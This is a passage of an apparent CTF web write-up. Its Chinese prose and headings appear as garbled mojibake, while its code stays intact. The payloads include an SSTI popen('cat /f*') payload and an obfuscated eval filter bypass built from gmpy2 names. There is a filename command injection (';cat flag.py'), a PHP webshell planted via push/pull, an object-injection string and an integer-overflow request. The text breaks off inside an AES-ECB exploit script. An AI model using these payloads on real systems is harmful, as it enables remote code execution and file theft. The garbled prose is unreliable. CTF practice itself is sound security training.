<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?0=9223372036854775807</span><br></pre></td></tr></table></figure>



<h2 id="ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰"><a href="#ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰" class="headerlink" title="ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰"></a>ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰</h2><p>å­¦åˆ°äº†ï¼Œæœ¬åœ°ä¿®æ”¹game.jsæ–‡ä»¶ï¼Œèµ¢ä¸€æ¬¡+2078åˆ†ï¼Œåƒä¸€ä¸ªå°±èƒ½æ‹¿flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309100011119.png" alt="image-20230910001159084"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309100012462.png" alt="image-20230910001215439"></p>
<h2 id="ç®—åŠ›è¶…ç¾¤"><a href="#ç®—åŠ›è¶…ç¾¤" class="headerlink" title="ç®—åŠ›è¶…ç¾¤"></a>ç®—åŠ›è¶…ç¾¤</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309100033711.png" alt="image-20230910003303691"></p>
<p>éšä¾¿ç®—ä¸ªæ•°ï¼Œè¿›å»æŠŠ5æ”¹æˆ7*7æœ‰æ­£ç¡®å›æ˜¾49ï¼Œé‚£å°±æ˜¯ssti</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?number1=&amp;operator=&amp;number2=__import__(&quot;os&quot;).popen(&quot;cat /f*&quot;).read()</span><br></pre></td></tr></table></figure>

<h2 id="ç®—åŠ›å‡çº§"><a href="#ç®—åŠ›å‡çº§" class="headerlink" title="ç®—åŠ›å‡çº§"></a>ç®—åŠ›å‡çº§</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/tiesuanzi&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiesuanzi</span>():</span><br><span class="line">    code=request.form.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> pattern.findall(code):<span class="comment">#ä»codeé‡ŒæŠŠå•è¯æ‹¿å‡ºæ¥</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+$&#x27;</span>,item):<span class="comment">#å¦‚æœä¸æ˜¯æ•°å­—</span></span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):<span class="comment">#é€ä¸ªå’Œgmpy2åº“é‡Œçš„å‡½æ•°åæ¯”è¾ƒ</span></span><br><span class="line">               <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;ä½ æƒ³å¹²ä»€ä¹ˆï¼Ÿ<span class="subst">&#123;item&#125;</span>ä¸æ˜¯æœ‰æ•ˆçš„å‡½æ•°&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=<span class="built_in">eval</span>(code)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;è®¡ç®—æˆåŠŸï¼Œç­”æ¡ˆæ˜¯<span class="subst">&#123;result&#125;</span>&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œè¯·æ£€æŸ¥ä½ çš„è¾“å…¥ã€‚&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>é™åˆ¶æ˜¯å®ç”¨çš„å…³é”®å­—åªèƒ½æ˜¯gmpy2ä¸­çš„å‡½æ•°å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(gmpy2)</span><br><span class="line">[<span class="string">&#x27;Default&#x27;</span>, <span class="string">&#x27;DivisionByZeroError&#x27;</span>, <span class="string">&#x27;HAVE_THREADS&#x27;</span>, <span class="string">&#x27;InexactResultError&#x27;</span>, <span class="string">&#x27;InvalidOperationError&#x27;</span>, <span class="string">&#x27;OverflowResultError&#x27;</span>, <span class="string">&#x27;RangeError&#x27;</span>, <span class="string">&#x27;RoundAwayZero&#x27;</span>, <span class="string">&#x27;RoundDown&#x27;</span>, <span class="string">&#x27;RoundToNearest&#x27;</span>, <span class="string">&#x27;RoundToZero&#x27;</span>, <span class="string">&#x27;RoundUp&#x27;</span>, <span class="string">&#x27;UnderflowResultError&#x27;</span>, <span class="string">&#x27;_C_API&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__path__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;_mpmath_create&#x27;</span>, <span class="string">&#x27;_mpmath_normalize&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;agm&#x27;</span>, <span class="string">&#x27;ai&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;bincoef&#x27;</span>, â€¦â€¦]</span><br></pre></td></tr></table></figure>

<p>å¯è§ï¼Œæœ‰ä¸€ä¸ª<code>__builtins__</code>å¯ä»¥ä½¿ç”¨ï¼Œè€Œä»<code>gmpy2.__builtins__</code>é‡Œæœ‰evalå‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&quot;</span></span><br><span class="line"><span class="comment">##&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]==eval</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;/&#x27;(). &quot;</span>:</span><br><span class="line">                temp_index=<span class="number">0</span></span><br><span class="line">                temp_string=<span class="string">&#x27;x&#x27;</span>*<span class="number">20</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):</span><br><span class="line">                        <span class="keyword">if</span> j.find(i)&gt;=<span class="number">0</span>:</span><br><span class="line">                                <span class="keyword">if</span> <span class="built_in">len</span>(j)&lt;<span class="built_in">len</span>(temp_string):</span><br><span class="line">                                        temp_string=j</span><br><span class="line">                                        temp_index=j.find(i)</span><br><span class="line">                payload+=<span class="string">f&#x27;\&#x27;<span class="subst">&#123;temp_string&#125;</span>\&#x27;[<span class="subst">&#123;temp_index&#125;</span>]+&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                payload+=<span class="string">f&#x27;\&quot;<span class="subst">&#123;i&#125;</span>\&quot;+&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=payload[:-<span class="number">1</span>]+<span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&#x27;c_div&#x27;[1]+&#x27;c_div&#x27;[1]+&#x27;ai&#x27;[1]+&#x27;agm&#x27;[2]+&#x27;cmp&#x27;[2]+&#x27;cos&#x27;[1]+&#x27;erf&#x27;[1]+&#x27;cot&#x27;[2]+&#x27;c_div&#x27;[1]+&#x27;c_div&#x27;[1]+&quot;(&quot;+&quot;&#x27;&quot;+&#x27;cos&#x27;[1]+&#x27;cos&#x27;[2]+&quot;&#x27;&quot;+&quot;)&quot;+&quot;.&quot;+&#x27;cmp&#x27;[2]+&#x27;cos&#x27;[1]+&#x27;cmp&#x27;[2]+&#x27;erf&#x27;[0]+&#x27;jn&#x27;[1]+&quot;(&quot;+&quot;&#x27;&quot;+&#x27;cmp&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;cot&#x27;[2]+&quot; &quot;+&quot;/&quot;+&#x27;erf&#x27;[2]+&#x27;lcm&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;agm&#x27;[1]+&quot;&#x27;&quot;+&quot;)&quot;+&quot;.&quot;+&#x27;erf&#x27;[1]+&#x27;erf&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;add&#x27;[1]+&quot;(&quot;+&quot;)&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="easyPytHon-P"><a href="#easyPytHon-P" class="headerlink" title="easyPytHon_P"></a>easyPytHon_P</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import request</span><br><span class="line">cmd: str = request.form.get(&#x27;cmd&#x27;)</span><br><span class="line">param: str = request.form.get(&#x27;param&#x27;)</span><br><span class="line"># ------------------------------------- Don&#x27;t modify â†‘ them â†‘! But you can write your code â†“</span><br><span class="line">import subprocess, os</span><br><span class="line">if cmd is not None and param is not None:</span><br><span class="line">    try:</span><br><span class="line">        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)</span><br><span class="line">        print(&#x27;Done!&#x27;)</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        print(&#x27;Timeout!&#x27;)</span><br><span class="line">    except:</span><br><span class="line">        print(&#x27;Error!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;No Flag!&#x27;)</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥cmdå’Œparamï¼Œcmdå€¼æˆªå–å‰ä¸‰ä¸ªï¼Œ__file__è¡¨ç¤ºçš„æ˜¯å½“å‰pyæ–‡ä»¶çš„ç»å¯¹è·¯å¾„</p>
<p>subprocess.run([â€œlsâ€,â€&#x2F;â€œ,â€&#x2F;etcâ€])ä¼šåŒæ—¶åˆ—å‡º&#x2F;å’Œ&#x2F;etcçš„æ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309101522095.png" alt="image-20230910152237015"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=cat&amp;param=/app/flag.txt</span><br></pre></td></tr></table></figure>

<h2 id="éåœ°é£˜é›¶"><a href="#éåœ°é£˜é›¶" class="headerlink" title="éåœ°é£˜é›¶"></a>éåœ°é£˜é›¶</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class="line">    echo &quot;å¥½å¤šé›¶&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;æ²¡æœ‰é›¶ï¼Œä»”ç»†çœ‹çœ‹è¾“å…¥æœ‰ä»€ä¹ˆé—®é¢˜å§&quot;;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¦æƒ³var_dumpå‡º$flagï¼Œå¿…é¡»è¦è®©<code>$_GET=$flag</code> &#x3D;&gt; <code>$key=_GET,$value=flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_GET=flag</span><br></pre></td></tr></table></figure>

<h2 id="èŒ¶æ­‡åŒº"><a href="#èŒ¶æ­‡åŒº" class="headerlink" title="èŒ¶æ­‡åŒº"></a>èŒ¶æ­‡åŒº</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309110030471.png" alt="image-20230910234931585"></p>
<p>æœ‰ä¸¤ç»„ï¼ŒFP&#x3D;1024-count*scoreï¼Œå¾—åˆ†&#x3D;count*score</p>
<p>çœ‹äº†ä¸€ä¸‹wpï¼Œè€ƒçš„æ˜¯phpæ•´å½¢æº¢å‡ºï¼Œå°±åªéœ€è¦å…ˆè®©countå–922337203685477580ï¼Œè®©åéƒ¨åˆ†æº¢å‡ºä¸ºè´Ÿæ•°ï¼Œå°±å¯ä»¥ä½¿å¾—æ•´ä½“çš„FP&gt;114514ï¼Œåœ¨æ­£å¸¸ä¹°å°±èƒ½è®©å¾—åˆ†&gt;114514</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#post å‘ä¸¤æ¬¡å°±å¯ä»¥äº†</span><br><span class="line">#ä¸çŸ¥é“ä¸ºä»€ä¹ˆä½†ä¸€ä¸ªeä¸è¡Œï¼Œå¾—å¤šåŠ ä¸¤ä¸ªå‚æ•°</span><br><span class="line">a=152000&amp;b=0&amp;c=0&amp;d=0&amp;e=922337203685477580&amp;submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81</span><br></pre></td></tr></table></figure>

<h2 id="å°èˆ”ç”°ï¼Ÿ"><a href="#å°èˆ”ç”°ï¼Ÿ" class="headerlink" title="å°èˆ”ç”°ï¼Ÿ"></a>å°èˆ”ç”°ï¼Ÿ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Moon&#123;</span><br><span class="line">    public $name=&quot;æœˆäº®&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;æˆ‘æ˜¯&quot;.$this-&gt;name.&quot;å¿«æ¥èµæˆ‘&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ion_Fan_Princess&#123;</span><br><span class="line">    public $nickname=&quot;ç‰›å¤«äºº&quot;;</span><br><span class="line"></span><br><span class="line">    public function call()&#123;</span><br><span class="line">        global $flag;</span><br><span class="line">        if ($this-&gt;nickname==&quot;å°ç”œç”œ&quot;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;ä»¥å‰é™ªæˆ‘çœ‹æœˆäº®çš„æ—¶å€™ï¼Œå«äººå®¶å°ç”œç”œï¼ç°åœ¨æ–°äººèƒœæ—§äººï¼Œå«äººå®¶&quot;.$this-&gt;nickname.&quot;ã€‚\n&quot;;</span><br><span class="line">            echo &quot;ä½ ä»¥ä¸ºæˆ‘è¿™ä¹ˆè¾›è‹¦æ¥è¿™é‡ŒçœŸçš„æ˜¯ä¸ºäº†è¿™æ¡è‡­ç‰›å—?æ˜¯ä¸ºäº†ä½ è¿™ä¸ªæ²¡è‰¯å¿ƒçš„è‡­çŒ´å­å•Š!\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;call();</span><br><span class="line">        return &quot;\t\t\t\t\t\t\t\t\t\t----&quot;.$this-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;code&#x27;]);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $a=new Ion_Fan_Princess();</span><br><span class="line">    echo $a;</span><br><span class="line">&#125;c</span><br></pre></td></tr></table></figure>

<p>å°è±¡é‡Œåšè¿‡è¿™ä¸ªï¼Œä½†å…·ä½“æ‰¾ä¸åˆ°äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;å°ç”œç”œ&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="LSBæ¢å§¬"><a href="#LSBæ¢å§¬" class="headerlink" title="LSBæ¢å§¬"></a>LSBæ¢å§¬</h2><p>è¢«è¯¯å¯¼äº†ï¼Œä»¥ä¸ºtsteg.pyä¸ä½†èƒ½è§£å¯†LSBï¼Œè¿˜èƒ½æ‰§è¡Œå…¶ä¸­è¯­å¥ï¼Œç»“æœåªæœ‰è§£å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># File       : app.py</span><br><span class="line"># Time       ï¼š2022/10/20 15:16</span><br><span class="line"># Author     ï¼šg4_simon</span><br><span class="line"># version    ï¼špython 3.9.7</span><br><span class="line"># Descriptionï¼šTSTEG-WEB</span><br><span class="line"># flag is in /app/flag.py</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from flask import *</span><br><span class="line">import os</span><br><span class="line">#åˆå§‹åŒ–å…¨å±€å˜é‡</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():    </span><br><span class="line">    return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            f = request.files[&#x27;file&#x27;]</span><br><span class="line">            f.save(&#x27;upload/&#x27;+f.filename)</span><br><span class="line">            cmd=&quot;python3 tsteg.py upload/&quot;+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;&quot;code&quot;:0,&quot;cmd&quot;:cmd,&quot;result&quot;:result,&quot;message&quot;:&quot;file uploaded!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">        except:</span><br><span class="line">            data=&#123;&quot;code&quot;:1,&quot;message&quot;:&quot;file upload error!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/source&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def show_source():</span><br><span class="line">    return render_template(&#x27;source.html&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=False)</span><br></pre></td></tr></table></figure>

<p><code>result=os.popen(&quot;python3 tsteg.py upload/...;cat flag.py&quot;).read()</code></p>
<p>è¿”å›çš„å°±æ˜¯python+catçš„å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=&quot;res_encode.png;cat flag.py&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Is-Not-Obfuscate"><a href="#Is-Not-Obfuscate" class="headerlink" title="Is_Not_Obfuscate"></a>Is_Not_Obfuscate</h2><p>é¢˜ç›®å¥‡æ€ª</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309111335252.png" alt="image-20230911133522177"></p>
<p>ä¼šæ‰§è¡Œdecodeä¹‹åçš„inputå‚æ•°ï¼Œè€Œä¸”robots.txté‡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Disallow: /lib.php?flag=0</span><br><span class="line">Disallow: /plugins</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥flag&#x3D;1ï¼Œå¾—åˆ°</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309111337834.png" alt="image-20230911133708811"></p>
<p>ä¸Šé¢ä¸€ä¸²O0ä¼°è®¡è¡¨ç¤ºåŠ å¯†ä»€ä¹ˆä¸œè¥¿ï¼Œä¸‹é¢çš„ä¼°è®¡å°±æ˜¯å¯†æ–‡</p>
<p>ç»“åˆä¸Šé¢çš„decodeï¼ŒæŠŠè¿™ä¸€ä¸²ä¼ å…¥åˆ°inputä¸­ï¼ŒæŠŠactionæ”¹ä¸ºtestæ‰§è¡Œï¼Œè¿˜å¾—urlç¼–ç ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;./plugins/&#x27;</span>))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;./plugins/&#x27;</span>, <span class="number">0777</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Test it and delete it ï¼ï¼ï¼</span></span><br><span class="line"><span class="comment">//æµ‹è¯•æ‰§è¡ŒåŠ å¯†åçš„æ’ä»¶ä»£ç </span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Anything is good?Please test it.&#x27;</span>;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;./plugins/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;pull&#x27;</span>:</span><br><span class="line">            <span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;pull success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;push success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºè¦å…ˆä¼ å…¥outputï¼ŒæŠŠæ–‡ä»¶å†™åˆ°.&#x2F;pluginsç›®å½•ä¸‹ï¼Œæ–‡ä»¶åæ˜¯md5åçš„ç»“æœ</p>
<p>ç„¶åevalæ‰§è¡Œ.&#x2F;plugins&#x2F;æ–‡ä»¶å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?input=&amp;action=push&amp;output=&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br><span class="line">?input=2e487432444053a0e4c42d08e42016a8&amp;action=pull&amp;output=</span><br></pre></td></tr></table></figure>

<h2 id="é¾™ç NFT"><a href="#é¾™ç NFT" class="headerlink" title="é¾™ç NFT"></a>é¾™ç NFT</h2><p>å®Œå…¨æ²¡æ€è·¯ï¼Œç©ä¸æ˜ç™½cryptoï¼Œç›´æ¥çœ‹wp</p>
<p>æ ¹æ®æºç å¯çŸ¥ï¼Œaddressæ˜¯ç”¨AESçš„ECBæ¨¡å¼åŠ å¯†çš„</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309112009132.png" alt="image-20230911200947045"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AESCipher():</span><br><span class="line">    def __init__(self,key):</span><br><span class="line">        self.key = self.add_16(hashlib.md5(key.encode()).hexdigest()[:16])</span><br><span class="line">        self.model = AES.MODE_ECB</span><br><span class="line">        self.aes = AES.new(self.key,self.model)</span><br></pre></td></tr></table></figure>

<p>è€Œæ˜æ–‡åˆ†ç»„é•¿åº¦æ˜¯16ä½ï¼Œå½“ä¸€ç»„æ˜æ–‡ç›¸ç­‰æ—¶ï¼ŒåŠ å¯†åçš„å¯†æ–‡ä¹Ÿåº”è¯¥ç›¸ç­‰</p>
<p>è€Œè¿”å›çš„æ•°å€¼æŒ‰16ä½åˆ†ç»„åçš„ç»“æœå°±æ˜¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309112027617.png" alt="image-20230911202754589"></p>
<p>æ˜¾ç„¶round_noæ˜¯ä¸€ç›´é€’å¢çš„ï¼Œæ€è·¯å°±æ˜¯åˆ æ‰å…¶ä¸­64-80è¿™ä¸€è¡Œï¼Œè¿™å°±è®©dragonballéšç€æ¬¡æ•°çš„å¢åŠ è€Œå¢åŠ </p>
<p>wpç»™çš„exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">url=<span class="string">&#x27;http://xxxxxxxxxxxxxxxxxxxxxx/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">username=<span class="built_in">str</span>(random.randint(<span class="number">1</span>,<span class="number">100000</span>))</span><br><span class="line"><span class="built_in">print</span>(username)</span><br><span class="line">r=s.get(url+<span class="string">&#x27;?username=&#x27;</span>+username)</span><br><span class="line">responses=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        r=s.get(url+<span class="string">&#x27;find_dragonball&#x27;</span>)</span><br><span class="line">        responses.append(json.loads(r.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> responses:</span><br><span class="line">	data=json.dumps(&#123;<span class="string">&#x27;player_id&#x27;</span>:item[<span class="string">&#x27;player_id&#x27;</span>],<span class="string">&#x27;dragonball&#x27;</span>:item[<span class="string">&#x27;dragonball&#x27;</span>],<span class="string">&#x27;round_no&#x27;</span>:item[<span class="string">&#x27;round_no&#x27;</span>],<span class="string">&#x27;time&#x27;</span>:item[<span class="string">&#x27;time&#x27;</span>]&#125;)</span><br><span class="line">        miwen=base64.b64decode(item[<span class="string">&#x27;address&#x27;</span>])</span><br><span class="line">        round_no=item[<span class="string">&#x27;round_no&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> round_no <span class="keyword">in</span> [<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>)]:</span><br><span class="line">                